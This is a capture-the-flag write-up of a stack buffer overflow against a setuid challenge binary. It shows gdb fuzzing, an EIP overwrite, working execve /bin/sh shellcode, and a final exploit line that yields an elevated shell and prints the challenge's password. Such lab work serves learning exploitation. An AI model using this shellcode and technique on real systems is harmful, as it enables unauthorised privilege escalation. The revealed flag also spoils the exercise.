

1. Fuzz

run $(python -c 'print "A" * 512')
Starting program: /challenge/app-systeme/ch7/ch7 $(python -c 'print "A" * 512')
[+] Running program with username

Program received signal SIGSEGV, Segmentation fault.
0x08040000 in ?? ()
(gdb) info registers 
eax            0x8040000	134479872
ecx            0x0	0
edx            0xb7fd1898	-1208149864
ebx            0xb7fd0000	-1208156160
esp            0xbffff96c	0xbffff96c
ebp            0xbffff988	0xbffff988
esi            0x0	0
edi            0x0	0
eip            0x8040000	0x8040000
eflags         0x10282	[ SF IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51


2. overwrite EIP

(gdb) run $(python -c 'print "A" * 512 + "B" * 4')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /challenge/app-systeme/ch7/ch7 $(python -c 'print "A" * 512 + "B" * 4')
[+] Running program with username

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info registers 
eax            0x42424242	1111638594
ecx            0x0	0
edx            0xb7fd1898	-1208149864
ebx            0xb7fd0000	-1208156160
esp            0xbffff96c	0xbffff96c
ebp            0xbffff988	0xbffff988
esi            0x0	0
edi            0x0	0
eip            0x42424242	0x42424242
eflags         0x10282	[ SF IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51




3. Return Address to beginning of "A" buffer.


(gdb) x/32wx 0xbffffb61
0xbffffb61:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb71:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb81:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb91:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffba1:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbb1:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbc1:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbd1:	0x41414141	0x41414141	0x41414141	0x41414141
(gdb) run $(python -c 'print "A" * 512 + "\x61\xfb\xff\xbf"')



4. Input Shellcode

DOESN'T WORK
===============================================================================
[-] Failed Shellcode:

\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05


system()
exit()
"/bin/sh"

(gdb) p exit
$1 = {<text variable, no debug info>} 0xb7e56260 <__GI_exit>
(gdb) p system
$2 = {<text variable, no debug info>} 0xb7e63310 <__libc_system>
(gdb) find 0xb7e23000,0xb7fce000,"/bin/sh"
0xb7f85d4c
1 pattern found.
0xb7e23000 0xb7fce000   0x1ab000        0x0 /lib/i386-linux-gnu/libc-2.19.so

===============================================================================

*note - EIP overwrite address was changed to \x81\xfb\xff\xbf because shell environment is different than gdb env.

[+] Success Shellcode: execve "/bin/sh"

\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80

no need for ROP

$(python -c 'import sys;sys.stdout.write("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "A" * (512-33) + "\x61\xfb\xff\xbf"))




app-systeme-ch7@challenge02:~$ ./ch7 $(python -c 'import sys;sys.stdout.write("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "A" * (512-33) + "\x81\xfb\xff\xbf")')
[+] Running program with username : j
                                     X�Rfh-p��Rjhh/bash/bin��RQS��̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
bash-4.3$ id
uid=1107(app-systeme-ch7) gid=1107(app-systeme-ch7) euid=1207(app-systeme-ch7-cracked) groups=1207(app-systeme-ch7-cracked),100(users),1107(app-systeme-ch7)
bash-4.3$ cat .passwd
aod8r2f!q:;oe
bash-4.3$

